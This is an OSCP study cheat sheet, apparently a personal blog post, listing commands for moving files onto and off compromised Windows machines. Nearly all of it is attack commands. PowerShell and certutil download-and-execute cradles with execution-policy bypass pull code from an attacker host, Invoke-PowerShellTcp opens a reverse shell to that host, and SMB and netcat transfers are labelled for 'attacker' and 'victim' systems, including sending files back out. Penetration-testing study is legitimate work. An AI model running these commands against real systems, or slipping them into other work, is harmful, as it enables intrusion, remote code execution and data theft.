---
title: Windows File Transfers
author: linatl
date: "2021-03-10 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---

###### Start a webserver
```
Python3
> sudo python3 -m http.server 80
Python2
> sudo python -m SimpleHTTPServer 80
```

###### wget
```
> wget.exe http://192.168.1.1:80/file.txt
> powershell.exe -exec bypass -Command "wget http://192.168.1.1:80/file.txt"
```

###### certutil
```
> certutil.exe -urlcache -f http://192.168.1.1:80/file.txt file.txt
> powershell.exe -exec bypass -Command "& {certutil.exe -urlcache -f http://192.168.1.1:80/file.txt}"
```

###### Powershell
```
Download
> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1/Invoke-PowerShellTcp.ps1', 'C:\Invoke-PowerShellTcp.ps1')
Run
> Invoke-PowerShellTcp.ps1 -Reverse -IPAddress 192.168.1.1 -Port 443

Execute exe
> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoPro
file -File file.ps1

Download and execute immediately
> powershell.exe -c IEX (New-Object System.Net.WebClient).DownloadString('
http://192.168.1.1/file.exe')
> powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('
http://192.168.1.1/file.exe')
```

###### impacket-smbserver
```
On attacker machine:
> impacket-smbserver transfer ./

On victim machine:
> dir \\192.168.1.1\transfer
> copy \\192.168.1.1\transfer\file.exe ./

Specify SMB2 support
> impacket-smbserver -smb2support transfer ./
```

###### netcat
```
On the target system:
> nc -lvp 80 > file.txt
On the attacker system:
> nc 192.168.1.1 80 < file.txt

Also works the other way, to get files back to the attacker system
```